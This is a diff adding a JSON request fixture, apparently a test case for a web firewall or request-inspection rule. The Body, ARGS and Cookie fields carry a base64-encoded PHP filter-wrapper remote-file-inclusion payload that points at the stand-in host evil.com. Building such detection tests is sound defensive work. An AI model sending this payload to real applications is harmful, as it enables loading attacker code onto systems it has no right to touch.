@@ -1,0 +1,14 @@
+{
+    "req": [
+      {
+        "Type": "ALL",
+        "UA": "",
+        "Body": "param=cGhwOi8vZmlsdGVyL3JlYWQ9c3RyaW5nLnJvdDEzL3Jlc291cmNlPWh0dHA6Ly9ldmlsLmNvbS9pbmRleC5waHA=",
+        "ARGS": "param=cGhwOi8vZmlsdGVyL3JlYWQ9c3RyaW5nLnJvdDEzL3Jlc291cmNlPWh0dHA6Ly9ldmlsLmNvbS9pbmRleC5waHA=",
+        "Cookie": "cGhwOi8vZmlsdGVyL3JlYWQ9c3RyaW5nLnJvdDEzL3Jlc291cmNlPWh0dHA6Ly9ldmlsLmNvbS9pbmRleC5waHA=",
+        "URL": "",
+        "Referer": "",
+        "Headers": ""
+      }
+    ]
+  }
